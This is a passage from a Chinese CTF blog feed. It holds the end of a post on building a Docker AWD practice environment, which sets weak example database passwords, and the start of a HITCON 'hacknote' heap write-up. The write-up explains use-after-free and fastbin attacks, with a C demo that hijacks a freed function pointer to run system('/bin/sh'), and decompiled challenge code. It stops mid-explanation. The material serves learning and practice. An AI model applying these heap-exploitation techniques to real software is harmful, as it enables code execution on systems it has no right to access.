awd1test</code></p><ul><li>18080:80表示把docker环境的80端口映射到主机的18080端口</li><li>13306:3306表示把docker环境的mysql服务映射到主机13306端口</li><li>10022:22表示映射ssh服务</li><li>19999:9999表示映射pwn题服务</li></ul></blockquote><p>执行命令之后，通过<code>sudo docker ps</code>查看正在运行的docker状态：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103231044.png" alt=""></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><blockquote><p>执行命令<code>sudo docker exec -ti 15d94d229fcb /bin/bash</code>进入容器。</p></blockquote><p>进入容器之后首先：</p><ul><li>通过<code>passwd</code>命令设置root用户的密码以及awduser用户的密码，并且开启ssh远程连接服务，以便运维和awd参赛者的连接。</li><li>设置完密码后开启ssh服务==&gt;<code>service ssh start</code>。</li><li>初始状态，mysql的root账户是没有密码的，所以需要手动为root添加密码<code>mysql&gt; set password for root@localhost = password(&#39;root&#39;);</code>，分发给参赛者的账户为admin，密码随机生成。</li><li>若有mysql数据库需要加载，则使用类似<code></code>source /var/www/html/web/tcho.sql;`命令来加载sql脚本文件。</li><li>添加参赛者数据库用户：<code>mysql&gt; insert into mysql.user(Host,User,Password) values(&quot;%&quot;,&quot;awduser&quot;,password(&quot;123456&quot;));</code></li></ul><p>关于具体的web题环境和pwn题环境，请自行更改相关文件。</p><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>运行起来的web服务：</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103233718.png" class="lazyload"></p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181104005557.png" class="lazyload"></p><p>运行在同一docker容器内的pwn:</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103233932.png" class="lazyload"></p><blockquote><p>虽然非常简陋，但是用于练习还是足够的。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境部署 </tag>
            
            <tag> docker </tag>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-11月02-Hitcon-六</title>
      <link href="/2018/11/02/Pwn-11%E6%9C%8802-Hitcon-%E5%85%AD/"/>
      <url>/2018/11/02/Pwn-11%E6%9C%8802-Hitcon-%E5%85%AD/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="Pwn-11月02-Hitcon-六"><a href="#Pwn-11月02-Hitcon-六" class="headerlink" title="Pwn-11月02-Hitcon-六"></a>Pwn-11月02-Hitcon-六</h1><blockquote><p>进度还是太慢了，不能再墨迹下去了💪！！</p></blockquote><h2 id="lab10-hacknote"><a href="#lab10-hacknote" class="headerlink" title="lab10-hacknote"></a>lab10-hacknote</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; 这是一道 fastbin uaf利用？fastbin是什么？uaf又是什么？又是一道涨姿势的题呢。啊啊啊从这儿开始就接触堆这玩意儿了！！！</p><p><a href="https://www.sohu.com/a/239388523_354899" target="_blank" rel="noopener">堆溢出学习之路</a></p></blockquote><h3 id="UAF-use-after-free"><a href="#UAF-use-after-free" class="headerlink" title="UAF (use after free)"></a>UAF (use after free)</h3><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; Use after free，跟字面上的意思一样：第一次申请的内存空间在释放过后没有进行内存回收，导致下次申请内存的时候再次使用该内存块，使得以前的内存指针可以访问修改过的内存。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 那通过UAF漏洞，我们能干嘛，当然是直接getshell，通过下面一段c程序，进行编译就能getshell了（程序代码来自<a href="https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1" target="_blank" rel="noopener">4ct10n的博客</a> ）：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>func_ptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">evil_fuc</span><span class="token punctuation">(</span><span class="token keyword">char</span> command<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">system</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">echo</span><span class="token punctuation">(</span><span class="token keyword">char</span> content<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    func_ptr <span class="token operator">*</span>p1<span class="token operator">=</span><span class="token punctuation">(</span>func_ptr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc addr: %p\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>echo<span class="token punctuation">;</span>    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"hello world\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针</span>    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"hello again\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//p1指针未被置空,虽然free了,但仍可使用.</span>    func_ptr <span class="token operator">*</span>p2<span class="token operator">=</span><span class="token punctuation">(</span>func_ptr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来.</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc addr: %p\n"</span><span class="token punctuation">,</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc addr: %p\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//p2与p1指针指向的内存为同一地址</span>    p2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>evil_fuc<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针.</span>    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>编译运行效果如下：</p><p><img src="https://i.loli.net/2018/11/02/5bdbf64c0bcc4.png" alt=""></p></blockquote><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><blockquote><p><a href="https://github.com/bash-c/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf" target="_blank" rel="noopener">fast bin参考PDF</a></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102194003.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102194047.png" alt=""></p><p>fastbin attack 通常与堆块联系在一起，是CTF中常见题型。</p><p>定义如下：</p><p>&nbsp; &nbsp; &nbsp; &nbsp; Fastbin Attack是fastbin在存储管理时，为保证快速分配，回收内存的需要，在内存管理的机制中出现的问题，进而造成的漏洞，能够通过漏洞改写main_arena上的FasbinY指针数组，从而获得“特定”（需要满足一定条件）地址的写权限。</p><p>至于main_arena，就引用一下stackoverflow的解释咯：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102215928.png" alt=""></p><p><code>main_arena</code> is a local symbol and is specifically <strong>not exported</strong>. the list of exported symbols is controlled via the <code>Version</code> files in the glibc source tree. this is, by design, to keep people from being able to link against random symbols that glibc uses internally (so as to not pollute the namespace as is required by POSIX and other standards).</p><blockquote><p>main_arena是不能导出的一个本地符号表。导出符号列表需要通过glibc源代码目录中的Version文件控制。这是设计用于防止人们链接glibc内部使用的随机符号，（所以不会像POSIX和其他标准那样污染命名空间）。</p></blockquote><p>gdb can find it because you have debug symbols available … either the C lib is not stripped, or you have the split debug symbols in <code>/usr/lib/debug/</code> and gdb is finding those. when you launch gdb, it will tell you things like <code>Reading symbols from /usr/lib/debug/xxxxx</code>.</p><blockquote><p>gdb可以找到main_arena，因为你可以获得一些调试符号表…当程序没有被脱衣服(not stripped)，或者你在<code>/ usr / lib / debug /</code>中拆分过调试符号，而gdb可以找到它们。当你启动gdb进行调试时，它会显示调试信息，例如<code>loading symbols from / usr / lib / debug / xxxxx</code>这种调试信息。</p></blockquote><p>the only way to be able to link against the symbol is to rebuild glibc from source and modify the export list.</p><blockquote><p>唯一能够链接到符号的方法是从源重构GLIBC并修改导出列表。</p></blockquote><p>alternatively, you could write some code in your app to behave like gdb. namely, open the debug file, process the ELF/DWARF information in it, apply relocations using the active loaded library info (see <code>dl_iterate_phdr</code>), and then just start poking memory directly.</p><blockquote><p>或者，你可以在你的应用程序中编写一些代码来像gdb调试一样。即通过应用程序，打开调试文件，处理其中的ELF / DWARF信息，使用活动加载的库信息应用重定位（请参阅dl_iterate_phdr），然后直接开始调用内存。</p></blockquote><p>if that’s too much work, a hackery solution might be to <code>fork()</code>+<code>popen()</code> gdb against your own process and run it in batch mode to dump symbol info.</p><blockquote><p>如果那太过于麻烦，黑客一点的解决方案可能是<code>fork（）+ popen（）</code>gdb调试你自己的进程，并以批处理模式运行它来转储符号信息。</p></blockquote><pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">;</span>FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span><span class="token function">asprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cmd<span class="token punctuation">,</span> <span class="token string">"gdb -q -p %i -batch -ex 'p &amp;main_arena'"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fp <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// parse the output of |fp| here looking for the address.</span><span class="token function">free</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></blockquote><h3 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p>那么开始做题吧，先checksec:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102203217.png" alt=""></p><p>可以看到，开启了栈溢出保护以及栈不可执行，那么这题很明显就是让我们从别的地方入手。</p></blockquote><h3 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>先简单运行一下程序：</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102203545.png" class="lazyload"></p><p>这种note类题目可以说是比较常见了。。。即使我不是pwn师傅，我也遇到过很多次，当然是一脸懵逼了，😭。</p></blockquote><p>通过IDA静态分析main函数，可以得到下面的伪C代码：</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//main函数</span><span class="token keyword">int</span> __cdecl __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">//菜单</span>      <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v3 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">del_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//删除指定对象</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token function">print_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//打印对象</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>LABEL_13<span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid choice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token keyword">goto</span> LABEL_13<span class="token punctuation">;</span>      <span class="token function">add_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//添加note</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>看看add函数：</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//add_note</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">add_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  _DWORD <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-1Ch]</span>  <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-18h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-14h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-Ch]</span>  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> count <span class="token operator">&lt;=</span> <span class="token number">5</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//先为notelist申请8大小的空间</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> print_note_content<span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Note size :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        size <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        v0 <span class="token operator">=</span> notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        v0<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//再为输入的内容（content）申请空间</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//读取内容</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">++</span>count<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Full"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>delete函数:</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">del_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> count <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//先free掉content</span>    <span class="token function">free</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//再free自己</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>print_note:</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">print_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> count <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__cdecl <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>还可以看到一个<code>magic（addr = 0x08048986)</code>函数，而这个函数就是我们的目标哦：</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102205533.png" class="lazyload"></p><blockquote><p> 解题逻辑：通过上面对fastbin，uaf的了解后，大概可以理解这个题目的解题方法了。我们首先要明白malloc和free机制，先被free掉的块会很快被应用于新的malloc，前提是大小合适，例如<code>free v1; v2 = 